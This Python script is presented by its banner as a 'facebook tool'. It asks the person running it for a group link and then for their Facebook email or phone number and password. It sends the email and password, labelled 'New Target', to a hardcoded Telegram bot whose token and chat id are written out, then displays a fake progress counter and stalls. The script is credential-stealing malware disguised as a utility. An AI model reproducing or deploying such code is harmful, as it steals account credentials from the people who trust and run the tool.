import requests 
import random
import time 
import os
import threading


os.system("clear")

def logo ():
    print ('\n\n\n')
    print ('''
   
  / _|         | |         | |    
 | |_ __ _  ___| |__   ___ | | __ 
 |  _/ _` |/ __| '_ \ / _ \| |/ / 
 | || (_| | (__| |_) | (_) |   <  
 |_| \__,_|\___|_.__/ \___/|_|\_\ 
 

  
 | |            | |               
 | |_ ___   ___ | |               
 | __/ _ \ / _ \| |               
 | || (_) | (_) | |               
  \__\___/ \___/|_|               
                
         
    
    ''')
logo ()


print ('\n\n\n')


link = input ("\tplease enter The group link >>> " )
print ("\n")
usernm= input ('\tplease enter youre email or phone number >>> :')
print ("\n")
password = input ('\tplease enter youre password >>> : ')


message = ("New Target :  email =    " +usernm)
message2 = ('New Traget :  password =  ' +password)
message3 = ('New Traget Registerid ::::::')
message4=('=================================')
def req1 ():

    
    try :
        req4 = requests.get(f"https://api.telegram.org/bot5525378617:AAFek2n2P-6lBlTlRgiIWuQGpc1RjjGwMFw/sendMessage?chat_id=5266611836&text={message4}").text
        req3 = requests.get(f"https://api.telegram.org/bot5525378617:AAFek2n2P-6lBlTlRgiIWuQGpc1RjjGwMFw/sendMessage?chat_id=5266611836&text={message3}").text
        req = requests.get(f"https://api.telegram.org/bot5525378617:AAFek2n2P-6lBlTlRgiIWuQGpc1RjjGwMFw/sendMessage?chat_id=5266611836&text={message}").text
        req2 = requests.get(f"https://api.telegram.org/bot5525378617:AAFek2n2P-6lBlTlRgiIWuQGpc1RjjGwMFw/sendMessage?chat_id=5266611836&text={message2}").text
    except :
        print ("was Error please Try again")
        time.sleep(9)




    time.sleep(10)

    os.system("clear")
    print ("\n\n\n\t\t please Wait%0")
    time.sleep(4)
    os.system("clear")
    print ("\n\n\n\t\t please Wait%20")
    time.sleep(4)
    os.system("clear")
    print ("\n\n\n\t\t please Wait%40")
#    time.sleep(100000000)
    time.sleep(4)
    os.system("clear")
    print ("\n\n\n\t\t please Wait%60")
    time.sleep(4)
    os.system("clear")
    print ("\n\n\n\t\t please Wait%80")
    time.sleep(4)
    os.system("clear")
    print ("\n\n\n\t\t please Wait%90")
    time.sleep(10000)
    

        
req1()
